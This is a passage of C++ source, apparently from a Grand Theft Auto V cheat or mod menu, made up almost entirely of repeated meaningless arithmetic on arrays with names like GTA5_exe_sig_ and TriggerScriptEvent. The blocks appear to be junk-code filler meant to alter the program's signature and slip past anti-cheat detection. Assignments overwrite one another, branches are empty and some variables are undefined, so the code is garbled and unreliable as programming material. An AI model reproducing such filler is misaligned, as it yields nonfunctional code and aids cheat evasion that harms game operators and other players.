							GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
							GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
							GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
							a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
							a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
						}
						else
						{
							GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
							GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
							GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
							GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
							GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
							GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
							a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
							a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
						}
						GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
						a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
						GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
						a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
						a = 0.0f;
						b = 0.0f;
						if (GTA5_exe_sig_[4] > 50.0f)
						{
							GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
						}
						a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
						a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
						GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
						GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
						NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
						a = 0.0f;
						a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
						b = 0.0f;
						GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
						a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
						GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
						GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
						GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
						GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
						GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
						GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
						GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
						GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
						a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
						a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
						GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
						GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
						GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
						if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
						{
						}
						else
							a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
						a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


						if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
						{
							TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
							TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
							TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
							TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
							TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
							a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
							a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
						}
						else
						{
							offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
							offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
							offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
							offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
							offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
							offset = (0xB1231 * 0xA) + 0xA12;
							a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
							a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
						}
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (5) / (2 * TriggerScriptEvent[2]);
						a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
						a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
						if (TriggerScriptEvent[4] > 50.0f)
						{
							TriggerScriptEvent[4] = TriggerScriptEvent[1];
						}
						a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
						a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
						offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
						NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
						a = 0.0f;
						a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
						b = 0.0f;
						TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
						a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
						offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
						TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
						TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
						TriggerScriptEvent[4] = TriggerScriptEvent[1];
						TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
						offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
						offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
						TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
						a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
						a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
						offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
						offset = (0xB1231 * 0xA) + 0xA12;
						offset = (0xB1231 * 0xA) + 0xA12;
						if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
						{
						}
						else
							a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
						a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

						if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
						{
							TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
							TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
							TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
							TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
							TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
							a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
							a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
						}
						else
						{
							TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
							TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
							TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
							TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
							TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
							TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
							a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
							a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
						}
						TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
						a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
						TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
						a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
						a = 0.0f;
						b = 0.0f;
						if (TriggerScriptEvent[4] > 50.0f)
						{
							TriggerScriptEvent[4] = TriggerScriptEvent[1];
						}
						a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
						a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
						TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
						TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
						NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
						a = 0.0f;
						a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
						b = 0.0f;
						TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
						a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
						TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
						TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
						TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
						TriggerScriptEvent[4] = TriggerScriptEvent[1];
						TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
						TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
						TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
						TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
						a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
						a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
						TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
						TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
						TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
						if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
						{
						}
						else
							a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
						a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
						tokens.push_back(b);
					}
					else if (Extern_Reader::StringManager::SeContemTexto(token, "<Z>"))
					{

					if (offset > aaaaaa)
					{
						matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
						matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
						matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
						matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
						matriz[7] = (0xB1231 * 0xA) + matriz[2];
						a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
						a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
					}
					else
					{
						offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
						offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
						offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
						offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
						offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
						a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
					}
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
					if (matriz[4] > 50.0f)
					{
						matriz[4] = matriz[1];
					}
					a2 = (matriz[4]) / (2 * matriz[2]);
					a1 = (matriz[3] + (2)) / (2 * matriz[2]);
					offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (matriz[3] + (5)) / (2 * matriz[2]);
					aaaaaa = ponteiro * 2;
					a = 0.0f;
					a1 = (matriz[3] + (4)) / (2 * matriz[2]);
					b = 0.0f;
					matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
					a2 = (matriz[4] + (3)) / (2 * matriz[2]);
					offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
					matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
					matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
					matriz[4] = matriz[1];
					matriz[7] = (0xB1231 * 0xA) + matriz[2];
					offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
					offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
					matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
					a2 = (matriz[4] + (3)) / (2 * matriz[2]);
					a2 = (matriz[4] + (2)) / (2 * matriz[2]);
					offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					offset = (0xB1231 * 0xA) + 0xA12;
					if (offset > aaaaaa)
					{
					}
					else
						a1 = (matriz[3] + (65)) / (2 * matriz[2]);
					a2 = (matriz[4] - (3)) / (2 * matriz[2]);

					if (matriz[1] > aaaaaa)
					{
						matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
						matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
						matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
						matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
						matriz[7] = (0xB1231 * 0xA) + matriz[2];
						a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
						a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
					}
					else
					{
						matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
						matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
						matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
						matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
						matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
						matriz[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
						a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
					}
					matriz[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
					matriz[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
					a = 0.0f;
					b = 0.0f;
					if (matriz[4] > 50.0f)
					{
						matriz[4] = matriz[1];
					}
					a2 = (matriz[4]) / (2 * matriz[2]);
					a1 = (matriz[3] + (2)) / (2 * matriz[2]);
					matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
					matriz[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (matriz[3] + (5)) / (2 * matriz[2]);
					aaaaaa = 0xB2 * 2;
					a = 0.0f;
					a1 = (matriz[3] + (4)) / (2 * matriz[2]);
					b = 0.0f;
					matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
					a2 = (matriz[4] + (3)) / (2 * matriz[2]);
					matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
					matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
					matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
					matriz[4] = matriz[1];
					matriz[7] = (0xB1231 * 0xA) + matriz[2];
					matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
					matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
					matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
					a2 = (matriz[4] + (3)) / (2 * matriz[2]);
					a2 = (matriz[4] + (2)) / (2 * matriz[2]);
					matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
					matriz[1] = (0xB1231 * 0xA) + 0xA12;
					matriz[1] = (0xB1231 * 0xA) + 0xA12;
					if (matriz[1] > aaaaaa)
					{
					}
					else
						a1 = (matriz[3] + (65)) / (2 * matriz[2]);
					a2 = (matriz[4] - (3)) / (2 * matriz[2]);

					if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
					{
						GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
						GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
						GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
						GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
						GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
						a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
						a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
					}
					else
					{
						offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
						offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
						offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
						offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
						offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
						a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
					}
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
					if (GTA5_exe_sig_[4] > 50.0f)
					{
						GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
					}
					a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
					a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
					offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
					NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
					a = 0.0f;
					a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
					b = 0.0f;
					GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
					offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
					GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
					GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
					GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
					GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
					offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
					offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
					GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
